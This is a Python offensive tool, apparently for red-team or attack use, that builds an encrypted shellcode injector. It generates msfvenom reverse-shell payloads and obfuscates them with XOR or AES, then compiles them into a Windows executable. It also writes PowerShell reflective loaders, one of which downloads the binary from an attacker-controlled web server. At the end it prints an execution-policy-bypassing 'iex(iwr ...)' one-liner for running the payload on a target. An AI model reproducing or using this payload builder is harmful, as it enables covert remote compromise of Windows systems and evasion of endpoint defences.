#!/usr/bin/env python3

import array, base64, random, string
from Crypto.Cipher import AES
from hashlib import sha256
import argparse, subprocess, os
import binascii
import tempfile


DEBUG = False

# powershell reflective loaders:
ps1_template = "[System.Reflection.Assembly]::Load((Invoke-WebRequest 'http://HOST:PORT/EXE').Content).GetType('SystemTest.Program', [Reflection.BindingFlags] 'Public,NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static,Public,NonPublic').Invoke($null, (, [string[]] ('KEY')));"
ps1_template_embedded = "[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String('BYTES')).GetType('SystemTest.Program', [Reflection.BindingFlags] 'Public,NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static,Public,NonPublic').Invoke($null, (, [string[]] ('KEY')));"


def get_random_string(length):
	letters = string.ascii_letters + string.digits
	result_str = ''.join(random.choice(letters) for i in range(length))
	return result_str

def aes_encrypt(key,iv,plaintext):
	key_length = len(key)
	if (key_length >= 32):
		k = key[:32]
	elif (key_length >= 24):
		k = key[:24]
	else:
		k = key[:16]

	aes = AES.new(k, AES.MODE_CBC, iv)
	pad_text = pad(plaintext, 16)
	return aes.encrypt(pad_text)

def hash_key(key):
	h = ''
	for c in key:
		h += hex(ord(c)).replace("0x", "")
	h = bytes.fromhex(h)
	hashed = sha256(h).digest()
	return hashed

def pad(data, block_size):
	padding_size = (block_size - len(data)) % block_size
	if padding_size == 0:
		padding_size = block_size
	padding = (bytes([padding_size]) * padding_size)
	return data + padding


def xor_encrypt(keybyte, data):
    result = b''
    for i in range(len(data)):
    	result += (int.from_bytes(keybyte, byteorder="little") ^ data[i]).to_bytes(1, byteorder="little")
    return result


def banner():
	print("Injector... encrypted payload, process hollowing, reflective execution\n")


def fail(failstr):
	print(f"[!] {failstr}!\n")
	exit(-1)


def main():
	
	banner()

	parser = argparse.ArgumentParser()
	parser.add_argument("-i", "--lhost",	default="0.0.0.0", type=str, help="listener ip address")
	parser.add_argument("-l", "--lport", 	default="443", type=str, help="listener port")
	parser.add_argument("-w", "--whost",	type=str, help="webserver ip address - defaults to listener ip")
	parser.add_argument("-r", "--wport", 	default="80", type=str, help="webserver port")
	parser.add_argument("-p", "--payload", 	type=str, help="msfvenom payload")
	parser.add_argument("-b", "--binary", 	type=str, help="binary (shellcode) payload")
	parser.add_argument("-f", "--exitfunc", default="process", type=str, help="exitfunc: process,seh,thread,none")
	parser.add_argument("-m", "--method", 	default="xor", type=str, help="encryption format: aes or xor.")
	parser.add_argument("-k", "--key", 		type=str, help="encryption key: xor requires '0x81' format, aes requires 32 char string")
	parser.add_argument("-e", "--winexe", 	default="test.exe", type=str, help="windows binary")
	parser.add_argument("-s", "--script", 	default="test.txt", type=str, help="windows PS1 reflective loader")
	parser.add_argument("-t", "--tempdir", 	type=str, help="directory for build artifacts (will create if necessary)")
	#parser.add_argument("-u", "--unified", 	default=True, type=boolean, help="embed exe in powershell script")
	args = parser.parse_args()

	lhost = args.lhost
	lport = args.lport
	whost = args.whost
	wport = args.wport
	payload = args.payload
	binary = args.binary
	exitfunc = args.exitfunc
	method = args.method
	key = args.key
	winexe = args.winexe
	winps1 = args.script
	tempdir = args.tempdir
	#unified = args.unified

	if payload is None and binary is None:
		fail("must specifiy payload or binary")

	if method not in ["xor","aes"]:
		fail("unrecognized method")

	print(f"[+] creating injector for {method} encrypted payload")

	if not tempdir:
		tempdir = tempfile.mkdtemp(prefix="injector-")
	else:
		tempdir = os.path.abspath(tempdir)
		if not os.path.exists(tempdir):
		   os.makedirs(tempdir)

	if not whost:
		whost = lhost

	buf = None

	if payload:
		print("[+] generating msfvenom payload...")
		result = subprocess.run(['msfvenom',
			'-p', payload,
			'LHOST=' + lhost,
			'LPORT=' + lport,
			'EXITFUNC=' + exitfunc,
			'-f', 'raw',
			'-o', tempdir+'/payload.bin'],
			capture_output=not DEBUG)
		if result.returncode != 0:
			fail("msfvenom failed")

		f = open(f"{tempdir}/payload.bin", "rb")
		buf = f.read()
		f.close()
		
	elif binary:
		f = open(f"{binary}", "rb")
		buf = f.read()
		f.close()

	else:
		fail("missing payload or binary")

	keystr = ""

	if method == "xor":
		if key:
			try:
				key = int(key, 16)
			except:
				fail("bad xor key - must be one non-zero hex byte")
			if key < 1 or key > 255:
				fail("bad xor key - must be one non-zero hex byte")
		else:
			key = random.randint(1, 255)
		
		key = key.to_bytes(1, byteorder='little')
		keystr = f"0x{binascii.hexlify(key).decode('latin')}"
		print(f"[+] key: {keystr}")

		encrypted = xor_encrypt(key, buf)
		b64 = base64.b64encode(encrypted)
		if DEBUG:
			print(f"[+] writing encrypted base64 encoded payload to {tempdir}/payload.b64")
			f = open(f"{tempdir}/payload.b64", "w")
			f.write(b64.decode('utf-8'))
			f.close()

		sfile = open("./templates/injector_xor_template.cs", "r")
		template = sfile.read()
		sfile.close()
	
	elif method == "aes":
		if not key:
			key = get_random_string(32)
		if len(key) != 32:
			fail(f"incorrect key size! {len(key)} - must be 32 bytes")

		keystr = key
		print(f"[+] key: {keystr}")

		hkey = hash_key(key)
		encrypted = aes_encrypt(hkey, hkey[:16], buf)
		b64 = base64.b64encode(encrypted)

		if DEBUG:
			print(f"[+] writing encrypted base64 encoded payload to {tempdir}/payload.b64")
			f = open(f"{tempdir}/payload.b64", "w")
			f.write(b64.decode('utf-8'))
			f.close()
			print(f"[+] writing key to {tempdir}/payload.key")
			f = open(f"{tempdir}/payload.key", "w")
			f.write(key)
			f.close()

		sfile = open("./templates/injector_aes_template.cs", "r")
		template = sfile.read()
		sfile.close()

	else:
		fail("enrecognized encryption format!")

	source = template.replace("@@@", b64.decode('utf-8'))
	f = open(f"{tempdir}/temp.cs", "w")
	f.write(source)
	f.close()

	result = subprocess.run(['mcs',
		'/optimize',
		'-out:' + winexe,
		tempdir+'/temp.cs'],
		capture_output=True)
	if result.returncode != 0:
		fail(f"mcs failed:\n{result}")
	print(f"[+] created: {winexe}")

	# generate both loaders:
	injector_ps1 = ps1_template.replace("HOST", whost).replace("PORT", wport).replace("EXE", winexe).replace("KEY", keystr)
	f = open(f"./iwr{winps1}", "w")
	f.write(injector_ps1)
	f.close()
	print(f"[+] created: iwr{winps1}")

	f = open(f"{winexe}", "rb")
	buf = f.read()
	f.close()
	b64 = base64.b64encode(buf).decode('ascii')
	injector_ps1 = ps1_template_embedded.replace("BYTES", b64).replace("KEY", keystr)
	f = open(f"./{winps1}", "w")
	f.write(injector_ps1)
	f.close()
	print(f"[+] created: {winps1}")

	print(f"[+] host http://{whost}:{wport}/{winps1} and execute on target:")
	print(f"""    powershell -ep bypass -nop -c "&{{iex(iwr 'http://{whost}:{wport}/{winps1}')}}" """)
	print("[*] done!")


if __name__ == '__main__':
	main()
